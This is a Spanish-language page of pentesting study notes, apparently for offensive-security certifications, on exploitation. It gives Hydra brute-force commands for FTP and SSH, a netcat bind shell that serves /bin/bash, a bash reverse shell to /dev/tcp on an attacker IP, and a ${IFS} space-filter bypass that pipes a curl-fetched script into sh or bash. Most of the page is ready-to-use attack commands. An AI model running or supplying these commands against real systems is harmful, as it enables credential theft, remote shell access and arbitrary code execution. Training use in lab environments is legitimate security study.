## Explotación
### Indice
- [FTP (Fuerza bruta)](#exftp)
- [SSH (Fuerza bruta)](#exssh)
- [Reverse Shell](#shell)
- [Experiencias con Reverse Shell](#exshell)

 <a name="exftp"></a>
### FTP
 
Fuerza bruta: ``` hydra -l user -P passwords.txt ftp://172.17.0.2```

 * Con -l le especificamos un usuario, con -L le especificamos un diccionario de usuarios. igual para la contraseña
 
Si aparece la version, se podría mirar algun exploit.
 
<a name="exssh"></a>
 ### SSH
 Fuerza bruta: ``` hydra -l user -P passwords.txt ssh://172.17.0.2 -s 2222```

 ## Reverse, Bind, Forward Shells
 
 Suponiendo que conseguimos realizar ejecución remota de comandos, podriamos tratar de enviarnos una shell interactiva desde la cual movernos por el sistema atacado. Tenemos 3 tipos:
 <a name="shell"></a>
 ### Reverse shell
 La víctima nos envía una shell interactiva a nosotros, que estremos a la escucha con netcat. En [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) tenemos diferentes maneras de ejecutar la shell remota según los recursos que dispongamos. Solamente deberíamos estar a la escucha con netcat de la siguiente manera:
 ```
 nc -nlvp 443
 ```
 ### Bind shell
 La conexión es igual que la anterior solo que de manera inversa. en este caso el atacante es el que está a la escucha pero ofreciendo una bash, para ello:
 ```
 Victima: nc -nlvp 443 -e /bin/bash
 Atacante: nc <ip> <puerto>
 ```
 
 ### Forward Shell
 Es una manera de evitar las restricciones que pudieramos tener a la hora de establecer una conexión, por ejemplo si a través de fiewall nos capasen los puertos. La consola no es 100% interactiva pero se puede simular.
 
 Para ello necesitamos poder subir archivos, y subiriamos el php reverse shell de pentestmonkey. y nos descargamos el siguiente ejecutable: [TTYoverHTTP](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py) 
 la manera de proceder es la siguiente:
 ```
 1. subir el fichero cmd.php (o como le queramos llamar)
 2. Editar si fuera necesario el ttyoverhttp, con la ruta y el nombre del fichero para decirle donde se ubica el php reverse shell
 3. Ejecutar tty_over_http.py
 ```


 <a name="inyeccion_comandos"></a>
 <a name="exshell"></a>
### Experiencias con Reverse Shell  

#### Si no deja introducir espacios en blanco, lo mejor es: 
1º Crear un fichero .sh que contenga el código de la reverse shell  
```
bash -c 'bash -i >& /dev/tcp/10.10.14.54/443 0>&1'
```
2º Montar un servidor web para ofrecer el fichero  
```
python3 -m http.server 80
```
3º En la parte donde podamos inyectar el comando:
```
curl${IFS}<IP>/shell.sh|sh
o
curl${IFS}<IP>/shell.sh|bash

${IFS} sería el espacio en bash
```
<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
